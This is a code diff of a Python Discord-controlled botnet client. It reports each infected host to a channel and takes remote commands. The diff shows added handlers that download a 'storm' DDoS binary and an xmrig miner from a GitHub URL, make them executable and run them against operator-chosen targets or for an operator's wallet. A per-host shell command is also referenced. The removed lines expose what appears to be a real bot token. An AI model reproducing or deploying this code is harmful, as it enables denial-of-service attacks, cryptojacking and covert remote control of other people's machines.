@@ -1,8 +1,8 @@
 from discord.ext import commands
 import requests, discord, urllib, psutil, socket, sys, os
 
-token = 'MTAzNzY3ODY2ODA5ODU4ODY3Mg.Ga_BmW.GO4anOENXODo3S19Xl-IGx67mm_FM72e8V7m3s' # Token
-channel_id = 1002498477927977053  # Channel ID
+token = 'abcdefg' # Token
+channel_id = 111111111  # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -24,19 +24,12 @@ async def on_ready():
     await channel.send(f"``[+] {hostname}@{ip}: Session opened``")
     
 
-# ----- Commands ----- #
+# ----- Bot Commands ----- #
 
 # sessions
 @bot.command()
 async def sessions(ctx):
     await ctx.send(f"``[*] {hostname}@{ip}``")
-    
-# info
-@bot.command(name=f"info.{hostname}@{ip}")
-async def ipinfo(ctx):
-    link = "https://sheesh.rip/ip"
-    f = requests.get(link)
-    await ctx.send(f"``[+] {hostname}@{ip}: IP Information`` ```json\n{f.text}```")
     
 # check
 @bot.command()
@@ -50,6 +43,56 @@ async def check(ctx):
         await ctx.send(f"``[+] {hostname}@{ip}: DDoS running``")
     else:
         await ctx.send(f"``[-] {hostname}@{ip}: DDoS not running``")
+    
+# ddos
+@bot.command()
+async def ddos(ctx, ddosarg):
+    if not os.path.exists("storm"):
+        url = "https://github.com/rxu7s/Public/raw/main/storm"
+        r = requests.get(url, allow_redirects=True)
+        open("storm", 'wb').write(r.content)
+        
+    ddosip = ''.join(ddosarg)
+    os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
+    await ctx.send(f"``[+] {hostname}@{ip}: DDoS started to {ddosip}``")
+    
+# stop ddos
+@bot.command()
+async def stopddos(ctx):
+    if "storm" in (i.name() for i in psutil.process_iter()):
+        os.popen("pkill storm")
+        await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
+    
+# miner
+@bot.command()
+async def miner(ctx, walletArg):
+    if not os.path.exists("xmrig"):
+        url = "https://github.com/rxu7s/Public/raw/main/xmrig"
+        r = requests.get(url, allow_redirects=True)
+        open("xmrig", 'wb').write(r.content)
+    
+    wallet = ''.join(walletArg)
+    os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
+    await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
+    
+# stop miner
+@bot.command()
+async def stopminer(ctx):
+    if "xmrig" in (i.name() for i in psutil.process_iter()):
+        os.popen("pkill xmrig")
+        await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
+    
+
+# ----- Self Commands ----- #
+
+# info
+@bot.command(name=f"info.{hostname}@{ip}")
+async def ipinfo(ctx):
+    link = "https://sheesh.rip/ip"
+    f = requests.get(link)
+    await ctx.send(f"""
+    ``[+] {hostname}@{ip}: IP Information``\n```IP:{f.headers['IP']}\nASN:{f.headers['ASN']}\nCountry:{f.headers['Country']}\nCity:{f.headers['City']}```
+    """)
     
 # shell
 @bot.command(name=f"shell.{hostname}@{ip}")
@@ -94,44 +137,6 @@ async def stopall(ctx):
     if "storm" in (i.name() for i in psutil.process_iter()):
         os.popen("pkill storm")
         await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
-    
-# ddos
-@bot.command()
-async def ddos(ctx, ddosarg):
-    if not os.path.exists("storm"):
-        url = "https://github.com/rxu7s/Public/raw/main/storm"
-        r = requests.get(url, allow_redirects=True)
-        open("storm", 'wb').write(r.content)
-        
-    ddosip = ''.join(ddosarg)
-    os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
-    await ctx.send(f"``[+] {hostname}@{ip}: DDoS started to {ddosip}``")
-    
-# stop ddos
-@bot.command()
-async def stopddos(ctx):
-    if "storm" in (i.name() for i in psutil.process_iter()):
-        os.popen("pkill storm")
-        await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
-    
-# miner
-@bot.command()
-async def miner(ctx, walletArg):
-    if not os.path.exists("xmrig"):
-        url = "https://github.com/rxu7s/Public/raw/main/xmrig"
-        r = requests.get(url, allow_redirects=True)
-        open("xmrig", 'wb').write(r.content)
-    
-    wallet = ''.join(walletArg)
-    os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
-    await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
-    
-# stop miner
-@bot.command()
-async def stopminer(ctx):
-    if "xmrig" in (i.name() for i in psutil.process_iter()):
-        os.popen("pkill xmrig")
-        await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
     
 
 bot.run(token)
